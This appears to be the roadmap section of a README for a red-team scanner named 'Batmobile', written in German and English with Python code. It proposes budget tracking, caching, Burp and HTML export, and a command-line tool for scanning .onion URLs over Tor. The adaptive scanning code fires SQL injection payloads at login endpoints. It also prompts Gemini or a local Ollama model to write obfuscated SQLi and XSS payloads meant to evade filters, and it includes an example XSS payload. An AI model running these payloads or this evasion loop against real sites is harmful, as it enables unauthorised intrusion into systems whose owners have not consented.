## Roadmap

###  Phase 1: Core Improvements

#### 1.1 Budget Tracking & Limits
```python
class BudgetAwareScanner(SecureRedTeamScanner):
    """Scanner mit Kostenüberwachung"""
    
    def __init__(self, *args, budget_limit=5.0, **kwargs):
        super().__init__(*args, **kwargs)
        self.budget_limit = budget_limit
        self.budget_spent = 0.0
        self.cost_log = []
        
    def track_api_call(self, service: str, input_tokens: int, output_tokens: int):
        """Trackt API Kosten"""
        costs = {
            'claude_sonnet_4': {'input': 3.0, 'output': 15.0},
            'gemini_flash': {'input': 0.075, 'output': 0.30}
        }
        
        cost = (input_tokens * costs[service]['input'] / 1_000_000 + 
                output_tokens * costs[service]['output'] / 1_000_000)
        
        self.budget_spent += cost
        self.cost_log.append({
            'timestamp': time.time(),
            'service': service,
            'cost': cost,
            'tokens': {'input': input_tokens, 'output': output_tokens}
        })
        
        return cost
    
    def check_budget(self, estimated_cost: float) -> bool:
        """Prüft ob Budget noch reicht"""
        return (self.budget_spent + estimated_cost) <= self.budget_limit
    
    def print_budget_status(self):
        """Zeigt Budget-Status"""
        print("\n" + "="*60)
        print("💰 BUDGET STATUS")
        print("="*60)
        print(f"Limit:     ${self.budget_limit:.2f}")
        print(f"Spent:     ${self.budget_spent:.4f}")
        print(f"Remaining: ${self.budget_limit - self.budget_spent:.4f}")
        print(f"Usage:     {(self.budget_spent/self.budget_limit*100):.1f}%")
        
        # Breakdown
        claude_cost = sum(log['cost'] for log in self.cost_log if 'claude' in log['service'])
        gemini_cost = sum(log['cost'] for log in self.cost_log if 'gemini' in log['service'])
        
        print(f"\nBreakdown:")
        print(f"  Claude: ${claude_cost:.4f}")
        print(f"  Gemini: ${gemini_cost:.4f}")
```

#### 1.2 Smart Caching
```python
def analyze_with_claude(self, results: List[ScanResult]) -> str:
    """Claude Analysis mit Cache"""
    # Pattern-basierter Cache Key
    cache_key = self._get_pattern_signature(results)
    
    if cache_key in self.analysis_cache:
        print("[💾] Using cached analysis (Cost: $0.00)")
        return self.analysis_cache[cache_key]
    
    # Budget Check
    estimated_cost = 0.03
    if not self.check_budget(estimated_cost):
        return "BUDGET EXCEEDED - Switch to local analysis"
    
    # Original Call
    prompt = self._build_analysis_prompt(results)
    
    message = self.claude.messages.create(
        model=CLAUDE_MODEL,
        max_tokens=2048,
        messages=[{"role": "user", "content": prompt}]
    )
    
    # Track costs
    self.track_api_call(
        'claude_sonnet_4',
        message.usage.input_tokens,
        message.usage.output_tokens
    )
    
    # Cache result
    analysis = message.content[0].text
    self.analysis_cache[cache_key] = analysis
    
    return analysis

def _get_pattern_signature(self, results: List[ScanResult]) -> str:
    """Erstellt Cache-Key aus Pattern"""
    pattern = {
        'count': len(results),
        'vulns': sum(1 for r in results if r.vulnerability_found),
        'patterns': sorted(set(r.response_pattern for r in results)),
        'severity': sorted(set(r.severity for r in results))
    }
    return hashlib.md5(json.dumps(pattern, sort_keys=True).encode()).hexdigest()
```

### 🔄 Phase 2: Advanced Features

#### 2.1 SQLi Adaptive Scanner
```python
def adaptive_sqli_scan(self, target_onion_url: str, max_iterations: int = 3) -> List[ScanResult]:
    """SQLi Scanner mit AI-Feedback-Loop"""
    results = []
    
    # SQLi Payloads Library
    sqli_payloads = [
        "' OR '1'='1",
        "1' UNION SELECT NULL,NULL--",
        "admin'--",
        "' OR '1'='1' /*"
    ]
    
    print(f"[*] Starting Adaptive SQLi Scan")
    
    # Iteration 1: Standard Test
    result = self._run_custom_sqli_scan(target_onion_url, sqli_payloads[0])
    results.append(result)
    print(f"    [1] Pattern: {result.response_pattern}")
    
    if result.vulnerability_found:
        return results
    
    # Adaptive Iterations
    for i in range(2, max_iterations + 1):
        if not self.gemini:
            break
            
        # Gemini generiert Evasion
        prompt = f"""
Generate an obfuscated SQL injection payload to bypass filtering.

Last scan result:
- Pattern: {result.response_pattern}
- Status: {result.status_code}

Requirements:
1. Must contain marker: {REDTEAM_MARKER}
2. Use evasion techniques:
   - Case variation (oR, UnIoN)
   - Comment injection (/**/
   - Encoding (%27, CHAR(39))
   - Alternative syntax

Reply ONLY with the payload!
"""
        
        try:
            response = self.gemini.models.generate_content(
                model='gemini-2.0-flash-exp',
                contents=prompt
            )
            
            evasion_payload = response.text.strip()
            
            # Track cost
            self.track_api_call('gemini_flash', 500, 100)
            
            print(f"    [+] Gemini: {evasion_payload[:60]}...")
            
        except Exception as e:
            print(f"    [!] Gemini failed: {e}")
            evasion_payload = sqli_payloads[i % len(sqli_payloads)]
        
        result = self._run_custom_sqli_scan(target_onion_url, evasion_payload)
        results.append(result)
        print(f"    [{i}] Pattern: {result.response_pattern}")
        
        if result.vulnerability_found:
            print(f"    [✓] SQLi confirmed!")
            break
    
    return results

def _run_custom_sqli_scan(self, target_onion_url: str, payload: str) -> ScanResult:
    """Führt SQLi Test aus"""
    target_hash = self._hash_target(target_onion_url)
    proxies = self._get_circuit_proxy('sqli')
    start_time = time.time()
    
    try:
        test_url = f"{target_onion_url}/login?username={quote(payload)}&password=test"
        
        response = requests.get(test_url, proxies=proxies, timeout=45)
        
        # SQLi Detection (Error-based)
        sqli_errors = [
            'SQL syntax', 'mysql_fetch', 'pg_query', 'sqlite_',
            'ORA-', 'Microsoft SQL', 'ODBC', 'PostgreSQL'
        ]
        
        vulnerability_found = any(err in response.text for err in sqli_errors)
        
        if vulnerability_found:
            response_pattern = "error_based_sqli"
        elif response.status_code in [403, 406]:
            response_pattern = "blocked"
        else:
            response_pattern = "sanitized"
        
        return ScanResult(
            target_hash=target_hash,
            scan_type="sqli_adaptive",
            vulnerability_found=vulnerability_found,
            severity="critical" if vulnerability_found else "low",
            response_pattern=response_pattern,
            status_code=response.status_code,
            timing_ms=(time.time() - start_time) * 1000,
            headers_fingerprint=json.dumps(self._extract_safe_fingerprint(response)['security_headers']),
            anomaly_score=self._calculate_anomaly_score(response, payload)
        )
        
    except Exception as e:
        return ScanResult(
            target_hash=target_hash,
            scan_type="sqli_adaptive",
            vulnerability_found=False,
            severity="error",
            response_pattern=f"error_{type(e).__name__}",
            status_code=0,
            timing_ms=(time.time() - start_time) * 1000,
            headers_fingerprint="{}",
            anomaly_score=0.0
        )
```

#### 2.2 Local LLM Support (Ollama)
```python
class LocalLLMScanner(SecureRedTeamScanner):
    """Scanner mit lokalem LLM (kostenlos!)"""
    
    def __init__(self, *args, ollama_model="llama3.2:3b", **kwargs):
        super().__init__(*args, **kwargs)
        self.ollama_model = ollama_model
        self.use_local = True
        
    def generate_attack_payload_local(self, last_result: ScanResult) -> str:
        """Nutzt lokales Ollama statt Gemini"""
        
        prompt = f"""You are a penetration tester. Generate an obfuscated XSS payload.

Context:
- Last response: {last_result.response_pattern}
- Status code: {last_result.status_code}

Requirements:
- Include marker: {REDTEAM_MARKER}
- Use obfuscation (no standard <script>alert(1)</script>)
- Reply with payload only!

Example: <svg/onload=alert('{REDTEAM_MARKER}')>
"""
        
        try:
            import requests
            response = requests.post(
                'http://localhost:11434/api/generate',
                json={
                    'model': self.ollama_model,
                    'prompt': prompt,
                    'stream': False
                },
                timeout=30
            )
            
            if response.status_code == 200:
                payload = response.json()['response'].strip()
                print(f"[🏠] Local LLM: {payload[:60]}...")
                return payload
            
        except Exception as e:
            print(f"[!] Ollama error: {e}")
        
        # Fallback zu Gemini
        if self.gemini:
            return self.generate_attack_payload_with_gemini(last_result)
        
        return self.get_xsspy_payload(0)
```

#### 2.3 Export Formate
```python
def export_for_burp(self) -> str:
    """Export für Burp Suite"""
    burp_json = {
        "target": {
            "scope": {
                "include": [{"host": h} for h in set(r.target_hash for r in self.scan_history)]
            }
        },
        "issues": []
    }
    
    for result in self.scan_history:
        if result.vulnerability_found:
            burp_json["issues"].append({
                "type": f"{result.scan_type.upper()}_vulnerability",
                "name": f"{result.scan_type.upper()} Injection",
                "severity": result.severity.capitalize(),
                "confidence": "Firm" if result.anomaly_score > 0.7 else "Tentative",
                "description": f"Pattern: {result.response_pattern}",
                "evidence": [
                    {
                        "type": "response_pattern",
                        "value": result.response_pattern
                    }
                ]
            })
    
    return json.dumps(burp_json, indent=2)

def export_html_report(self) -> str:
    """Generiert HTML Report"""
    html = """
<!DOCTYPE html>
<html>
<head>
    <title>Batmobile Scan Report</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        .vuln { color: #f00; }
        .safe { color: #0f0; }
        table { border-collapse: collapse; width: 100%; }
        td, th { border: 1px solid #333; padding: 8px; text-align: left; }
    </style>
</head>
<body>
    <h1>🦇 BATMOBILE SCAN REPORT</h1>
    <table>
        <tr><th>Target</th><th>Type</th><th>Status</th><th>Severity</th></tr>
"""
    
    for r in self.scan_history:
        status_class = "vuln" if r.vulnerability_found else "safe"
        html += f"""
        <tr class="{status_class}">
            <td>{r.target_hash}</td>
            <td>{r.scan_type}</td>
            <td>{'VULNERABLE' if r.vulnerability_found else 'SECURE'}</td>
            <td>{r.severity}</td>
        </tr>
"""
    
    html += """
    </table>
</body>
</html>
"""
    return html
```

### 🚀 Phase 3: Integration & Automation

#### 3.1 CLI Tool
```python
# cli.py
import argparse

def main():
    parser = argparse.ArgumentParser(description='Batmobile Red Team Scanner')
    parser.add_argument('target', help='.onion URL to scan')
    parser.add_argument('--budget', type=float, default=5.0, help='Budget limit in USD')
    parser.add_argument('--iterations', type=int, default=3, help='Max adaptive iterations')
    parser.add_argument('--export', choices=['burp', 'html', 'json'], help='Export format')
    parser.add_argument('--local-llm', action='store_true', help='Use Ollama instead of Gemini')
    
    args = parser.parse_args()
    
    # Init Scanner
    if args.local_llm:
        scanner = LocalLLMScanner(
            claude_api_key=os.getenv('ANTHROPIC_API_KEY')
        )
    else:
        scanner = BudgetAwareScanner(
            budget_limit=args.budget,
            claude_api_key=os.getenv('ANTHROPIC_API_KEY'),
            gemini_api_key=os.getenv('GEMINI_API_KEY')
        )
    
    # Run Scan
    print(f"🦇 Scanning {scanner._hash_target(args.target)}...")
    results = scanner.adaptive_xss_scan(args.target, args.iterations)
    
    # Export
    if args.export == 'burp':
        print(scanner.export_for_burp())
    elif args.export == 'html':
        with open('report.html', 'w') as f:
            f.write(scanner.export_html_report())
        print("[+] Report saved to report.html")
    else:
        print(scanner.generate_report())
    
    scanner.print_budget_status()

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
# Basic scan
python cli.py http://example.onion

# Mit Budget Limit
python cli.py http://example.onion --budget 2.50

# Mit lokalem LLM (kostenlos!)
python cli.py http://example.onion --local-llm

# Export zu Burp
python cli.py http://example.onion --export burp > burp_import.json
```

